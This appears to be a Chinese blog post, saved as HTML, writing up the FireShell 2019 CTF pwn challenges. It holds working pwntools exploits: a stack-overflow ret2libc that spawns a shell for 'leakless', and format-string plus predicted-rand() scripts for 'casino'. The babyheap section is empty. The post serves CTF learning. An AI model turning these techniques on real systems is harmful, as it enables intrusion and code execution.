@@ -1,0 +1,554 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    
+    
+    <title>fireshell-2019-pwn | Room of Equirement | pwn what you want</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="keywords" content="pwn,stack,heap">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+    <link rel="stylesheet" href="/css/third-party/swipebox.min.css?v=1.3.2">
+    <link rel="stylesheet" href="/css/style.css?v=1.3.2">
+    
+    <script type="text/javascript">
+        // Data Center
+        var DC = {
+            reward:	true,
+            lv: JSON.parse('{"enable":false,"app_id":null,"app_key":null,"icon":true}'),
+            v: JSON.parse('{"enable":false,"appid":null,"appkey":null,"notify":true,"verify":true,"placeholder":"give me some sugers plz...","avatar":"wavatar"}'),
+            g: JSON.parse('{"enable":false,"lazy":true,"owner":"siriuswhiter","repo":"gitment","oauth":{"client_id":null,"client_secret":null},"perPage":10}'),
+            d: JSON.parse('{"app_id":null}')
+        };
+    </script>
+    <script type="text/javascript">
+        window.lazyScripts=[];
+    </script>
+    
+</head>
+
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap">
+      
+      <img src="/img/brand.jpg" class="brand-bg">
+      
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">Sirius Whiter</h5>
+          <a href="mailto:xuewenjie2017@outlook.com" title="xuewenjie2017@outlook.com" class="mail">
+            
+              <span>x</span>
+            
+              <span>u</span>
+            
+              <span>e</span>
+            
+              <span>w</span>
+            
+              <span>e</span>
+            
+              <span>n</span>
+            
+              <span>j</span>
+            
+              <span>i</span>
+            
+              <span>e</span>
+            
+              <span>2</span>
+            
+              <span>0</span>
+            
+              <span>1</span>
+            
+              <span>7</span>
+            
+              <span>@</span>
+            
+              <span>o</span>
+            
+              <span>u</span>
+            
+              <span>t</span>
+            
+              <span>l</span>
+            
+              <span>o</span>
+            
+              <span>o</span>
+            
+              <span>k</span>
+            
+              <span>.</span>
+            
+              <span>c</span>
+            
+              <span>o</span>
+            
+              <span>m</span>
+            
+          </a>
+        </hgroup>
+        
+        <ul class="menu-link">
+          
+              <li>
+                <a href="https://github.com/siriuswhiter" target="_blank">
+                  <i class="icon icon-lg icon-github"></i>
+                </a>
+              </li>
+            
+        </ul>
+        
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                HOME
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                CATEGORIES
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                TAGS
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                ARCHIVES
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-user"></i>
+                ABOUT
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="https://github.com/siriuswhiter" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        
+	
+<header class="top-header" id="header">
+    <div class="flex-row clearfix">
+        <a href="javascript:;" class="header-icon pull-left waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">
+            <span>fireshell-2019-pwn</span>
+            
+        </div>
+        
+        <a href="javascript:;" id="site_search_btn" class="header-icon pull-right waves-effect waves-circle waves-light">
+            <i class="icon icon-lg icon-search"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+    <img src="/img/banner.jpg" class="header-bg">
+    <div class="container fade-scale">
+        <h1 class="title">fireshell-2019-pwn</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2019-01-29T09:09:33.000Z" itemprop="datePublished" class="page-time">
+  2019-01-29
+</time>
+
+
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/pwn/">pwn</a></li></ul>
+
+            
+        </h5>
+        
+    </div>
+    
+
+</header>
+
+<div id="site_search">
+    <div class="search-title clearfix">
+        <span class="pull-left">
+          <i class="icon icon-lg icon-search"></i>
+        </span>
+        <input type="text" id="local-search-input" name="q" results="0" placeholder="search my blog..." class="form-control pull-left"/>
+        <a href="javascript:;" class="close pull-right waves-effect waves-circle waves-light">
+          <i class="icon icon-lg icon-close"></i>
+        </a>
+    </div>
+    <div id="local-search-result"></div>
+</div>
+
+
+
+
+<div class="container body-wrap">
+    <article id="post-fireshell-2019-pwn"
+  class="post-article article-type-post" itemprop="blogPost">
+    <div class="post-card">
+        <h1 class="post-card-title">fireshell-2019-pwn</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2019-01-29 17:09:33" datetime="2019-01-29T09:09:33.000Z"  itemprop="datePublished">2019-01-29</time>
+
+            
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/pwn/">pwn</a></li></ul>
+
+
+
+            
+
+            
+
+
+            
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            
+            <p><em>本来在之前没搞完的jarvisOJ那边遇到了问题，想问学长来着，结果被拉过来看看这个比赛，被自己菜哭</em></p>
+<h1 id="leakless"><a href="#leakless" class="headerlink" title="leakless"></a>leakless</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">char buf; // [esp+0h] [ebp-48h]</span><br><span class="line">return read(0, &amp;buf, 0x100u);</span><br></pre></td></tr></table></figure>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>一个简单的栈溢出，第一反应是去泄露libc版本，后面又突然想着把shellcode写到bss段，但是奈何总是不成功，vmmap才发现bss段不可执行，且不存在能够wx的段，因为以前用LibcSearcher没成功（ps:完全不记得为什么），偏偏用DynElf爆破失败，所以还是转向LibcSearcher.</p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">sh = process(&apos;./leakless&apos;)</span><br><span class="line">libc = ELF(&apos;./leakless&apos;)</span><br><span class="line"></span><br><span class="line">pay = &apos;a&apos;*0x48 + &apos;bbbb&apos; + p32(libc.symbols[&apos;puts&apos;])+p32(libc.symbols[&apos;feedme&apos;]) +p32(libc.got[&apos;puts&apos;])</span><br><span class="line">sh.sendline(pay)</span><br><span class="line">puts_got_addr = u32(sh.recv(4))</span><br><span class="line">print &quot;puts_got_addr: &quot;+hex(puts_got_addr)</span><br><span class="line"></span><br><span class="line">obj = LibcSearcher(&quot;puts&quot;,puts_got_addr)</span><br><span class="line"></span><br><span class="line">system_addr = puts_got_addr - obj.dump(&apos;puts&apos;)+obj.dump(&quot;system&quot;)</span><br><span class="line">binsh_addr = puts_got_addr - obj.dump(&apos;puts&apos;) + obj.dump(&quot;str_bin_sh&quot;)</span><br><span class="line"> </span><br><span class="line">success( &quot;system_addr: &quot;+hex(system_addr))</span><br><span class="line">success(&quot;binsh_addr: &quot;+hex(binsh_addr))</span><br><span class="line"></span><br><span class="line">pay = &apos;a&apos;*0x48 + &apos;bbbb&apos; + p32(system_addr) + p32(libc.symbols[&apos;main&apos;]) + p32(binsh_addr)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.sendline(pay)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="casino"><a href="#casino" class="headerlink" title="casino"></a>casino</h1><h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><p>用户输入的值与随机数匹配成功100次，之后会读取flag.txt文件并输出。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">seed = (unsigned int)time(0LL) / 10;</span><br><span class="line">seed += bet;(bet=1)</span><br><span class="line">srand(seed);</span><br><span class="line">rand();</span><br></pre></td></tr></table></figure>
+<h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>格式化字符串漏洞，但是大小限制在了0x10，能够泄露出来seed，也就能预测第一次的值，然后因为要泄露100次，想着顺便把栈上的记录次数的值或者bet一起改掉，但是因为长度限制，最后有点懵。感觉二者不可得兼。</p>
+<p>看大佬们的wp，因为seed是用time(0)/10+ bet ,可以先自己先利用time将seed计算出来，然后计算rand();因为python和c的rand()不同，所以得考虑如何将在python脚本中计算c的随机数，可以有：</p>
+<ol>
+<li>单独写一份c的程序计算随机数，脚本中调用c程序(昨天也是这么做的)； </li>
+<li>使用python和c的混合编程包：ctypes。</li>
+</ol>
+<p>经实践，同一个seed得到的随机数序列都是一样的…，而题中通过time(0)/10对seed给了容错</p>
+<h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><ol>
+<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from time import *</span><br><span class="line"></span><br><span class="line">context.log_level=&apos;debug&apos;</span><br><span class="line"></span><br><span class="line">now=int(time())/10+2</span><br><span class="line"></span><br><span class="line">sh=process(&quot;./timerand&quot;)</span><br><span class="line"></span><br><span class="line">###</span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	int i;</span><br><span class="line">	int seed;</span><br><span class="line">	scanf(&quot;%d&quot;,&amp;seed);</span><br><span class="line">	srand(seed);</span><br><span class="line">	for(i = 0; i &lt; 100; i++)</span><br><span class="line">	&#123;</span><br><span class="line">    		printf(&quot;%d &quot;,rand());</span><br><span class="line">   	&#125;</span><br><span class="line">	printf(&quot;\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">###</span><br><span class="line"></span><br><span class="line">sh.sendline(str(now))</span><br><span class="line">rand=sh.recvuntil(&quot;\n&quot;).strip().split(&quot; &quot;)</span><br><span class="line">print rand</span><br><span class="line">sh.close()</span><br><span class="line"></span><br><span class="line">#sleep(0.5)</span><br><span class="line"></span><br><span class="line">#sh=remote(&quot;challs.fireshellsecurity.team&quot;,31006)</span><br><span class="line">sh=process(&apos;./casino&apos;)</span><br><span class="line">sh.sendafter(&quot;What is your name? &quot;,&quot;aa%11$hn&quot;+p64(0x602020))</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">for i in range(99):</span><br><span class="line">   sh.sendlineafter(&quot;number: &quot;,rand[i])</span><br><span class="line">print sh.recv()</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+</li>
+<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from ctypes import cdll</span><br><span class="line"></span><br><span class="line">sh = process(&quot;./casino&quot;)</span><br><span class="line">sh.recvuntil(&apos;What is your name? &apos;)</span><br><span class="line">sh.send(&quot;%8$p&quot;)</span><br><span class="line">sh.recvuntil(&apos;Welcome &apos;)</span><br><span class="line">seed =eval(sh.recvuntil(&apos;\n&apos;,drop=True))&amp;0xffffffff  &lt;--- 数据类型转换成int型</span><br><span class="line">print seed</span><br><span class="line">sh.close()</span><br><span class="line">seed += 3</span><br><span class="line">libc = cdll.LoadLibrary(&quot;&quot;)   &lt;--- 突然发现这里为空也不影响？？</span><br><span class="line">libc.srand(seed)</span><br><span class="line"></span><br><span class="line">sh = process(&apos;./casino&apos;)</span><br><span class="line">pay = &apos;aaa%11$n&apos;+p64(0x602020)</span><br><span class="line">sh.recvuntil(&apos;What is your name? &apos;)</span><br><span class="line">sh.send(pay)</span><br><span class="line">for i in range(99):</span><br><span class="line">	sh.sendlineafter(&quot;Guess my number: &quot;,str(libc.rand()))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h1 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h1><h2 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h2><h2 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h2><h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2>
+        </div>
+        
+<blockquote class="post-copyright">
+    <div class="content">
+        
+<span class="post-time">
+    Last updated: <time datetime="2019-01-29T13:41:21.107Z" itemprop="dateUpdated">2019-01-29 21:41:21</time>
+</span><br>
+
+
+        
+        转载注明出处，原文地址：<a href="/2019/01/29/fireshell-2019-pwn/" target="_blank" rel="external">http://siriuswhiter.tk/2019/01/29/fireshell-2019-pwn/</a>
+        
+    </div>
+    <footer>
+        <a href="http://siriuswhiter.tk">
+            <img src="/img/avatar.jpg" alt="Sirius Whiter">
+            Sirius Whiter
+        </a>
+    </footer>
+</blockquote>
+
+        
+            <div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+            
+        
+        <div class="post-footer">
+            
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/heap/">heap</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/stack/">stack</a></li></ul>
+
+            <div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://siriuswhiter.tk/2019/01/29/fireshell-2019-pwn/&title=《fireshell-2019-pwn》 — Room of Equirement&pic=http://siriuswhiter.tk/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://siriuswhiter.tk/2019/01/29/fireshell-2019-pwn/&title=《fireshell-2019-pwn》 — Room of Equirement&source=pwn菜鸡一枚" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+        </div>
+        
+            
+
+
+        
+    </div>
+    
+<nav class="post-nav flex-row flex-justify-between flex-row-reverse">
+  
+
+  
+    <div class="next">
+      <a href="/2019/01/24/introduction-to-pwn2-8-houseofeinherjar/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">Introduction to pwn2.8-HouseOfEinherjar</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+    
+    
+        <aside class="post-widget">
+            <nav class="post-toc-wrap" id="post-toc">
+                <strong>目录</strong>
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#leakless"><span class="post-toc-number">1.</span> <span class="post-toc-text">leakless</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#题目"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">题目</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#分析"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">分析</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#exp"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">exp</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#casino"><span class="post-toc-number">2.</span> <span class="post-toc-text">casino</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#题目-1"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">题目</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#分析-1"><span class="post-toc-number">2.2.</span> <span class="post-toc-text">分析</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#exp-1"><span class="post-toc-number">2.3.</span> <span class="post-toc-text">exp</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#babyheap"><span class="post-toc-number">3.</span> <span class="post-toc-text">babyheap</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#题目-2"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">题目</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#分析-2"><span class="post-toc-number">3.2.</span> <span class="post-toc-text">分析</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#exp-2"><span class="post-toc-number">3.3.</span> <span class="post-toc-text">exp</span></a></li></ol></li></ol>
+            </nav>
+            <div class="toc-bar"><div>
+        </aside>
+    
+</article>
+
+    <div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        我们一起来让这个世界有趣一点
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/reward-wechat.jpg" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/reward-wechat.jpg" data-alipay="/img/reward-alipay.jpg">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+    
+</div>
+
+        <footer class="footer">
+    
+    <div class="top">
+        
+    </div>
+    
+    <div class="bottom">
+        <p>
+            <span>
+                Sirius Whiter &copy; 2018 - 2019
+            </span>
+        		
+           	
+            
+            
+            <span>
+	            Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/codefine/hexo-theme-mellow" target="_blank">mellow</a>
+            </span>
+            
+            
+            
+
+            
+                
+<span class="site-uv" title="总访客量">
+    <i class="icon icon-user"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
+</span>
+
+
+<span class="site-pv" title="总访问量">
+    <i class="icon icon-eye"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>
+</span>
+
+            
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://siriuswhiter.tk/2019/01/29/fireshell-2019-pwn/&title=《fireshell-2019-pwn》 — Room of Equirement&pic=http://siriuswhiter.tk/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://siriuswhiter.tk/2019/01/29/fireshell-2019-pwn/&title=《fireshell-2019-pwn》 — Room of Equirement&source=pwn菜鸡一枚" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACMklEQVR42u3azY6DMAxF4b7/SzPSrEZigHNtqIRzsqpa2ubLwvJPPh+8tt+1f+fv2r+//+758/tPb14yZMh4LWM7XUdb4cijZwiD7E2GDBnrMM6DLA+p5xtNgzvZmwwZMmTwRJAEaB52ZciQIaMfcEkgJuG4w5YhQ8ZqDF5M8sI1TSu/VIvLkCHjhYxOYfn06wfnGzJkyHgJYyut/rAzDawXvyBDhozRjE7jvpbA9dPEYFsyZMgYwUhb/GkTLT244lhUhgwZoxlPjBhJalgLwcF8Q4YMGeMYtRZ8Z6jJjyAejsqQIWMco5ac8aStH0xJk06GDBmzGXxbfLskRPYvil0UsTJkyBjNqBWxJCCmh0UOQoYMGSsw0qBZS/v480W2DBkylmGkDTLekus35oKAK0OGjKGMWvPrriYaH5EG18JkyJAxiMGDXYpBf9wO6DJkyFiNkTb9+XdvCKa8lJUhQ8Y4Ruc2WX+Ld5W+MmTImM1IS0rekqsheTp4OImVIUPGaEZa6KYJ4vmT6TF9gg9kyJAxh8Eb+umGSDjmTb3gyoUMGTIGMcgfpGlf7Xd4iw2FXRkyZIxgbOFKw25aGKcXL/653SZDhoxxjOLMs5Hq1a5cBKmhDBkyhjLSIMtvZN2VgMqQIUNGrdFGkry0AO4MJ2TIkCGjVmSm6Wb6L0H2KkOGjGUY/IJF7YDOW2kXRyNDhowFGHwwycG1UWitSSdDhozZjE6zngfWGjItoWXIkDGO8QMKV9sZuTgTcgAAAABJRU5ErkJggg==" alt="微信分享二维码">
+</div>
+
+
+    
+    <!-- main-js -->
+<script type="text/javascript" src="//cdn.bootcss.com/jquery/2.1.0/jquery.min.js"></script>
+<script type="text/javascript" src="/js/plugins/fastclick.js?v=1.3.2"></script>
+<script type="text/javascript" src="/js/plugins/ios-orientationchange-fix.js?v=1.3.2"></script>
+<script type="text/javascript" src="/js/plugins/jquery.swipebox.min.js?v=1.3.2"></script>
+<script type="text/javascript" color="255,0,0"opacity="0.3"count="70" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+
+<script type="text/javascript" src="https://cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+
+<script type="text/javascript" src="/js/method.js?v=1.3.2"></script>
+<script type="text/javascript" src="/js/blog.js?v=1.3.2"></script>
+
+<!-- third-party -->
+<script type="text/javascript">
+;( function( $ ) {
+
+	$( '.swipebox' ).swipebox({
+		hideCloseButtonOnMobile: true
+	});
+
+} )( jQuery );
+</script>
+
+
+
+
+
+
+<script type="text/javascript" src="/js/plugins/local_search.js?v=1.3.2"></script>
+<script type="text/javascript">
+	var search_path = "search.xml";
+	if (search_path.length === 0) {
+		search_path = "search.xml";
+	}
+	var path = "/" + search_path;
+	searchFunc(path, "local-search-input", "local-search-result");
+</script>
+
+
+
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+    
+    
+
+
+
+
+
+    <!-- mathjax config similar to math.stackexchange -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+            processEscapes: true,
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+
+
+
+
+
+    
+</body>
+</html>
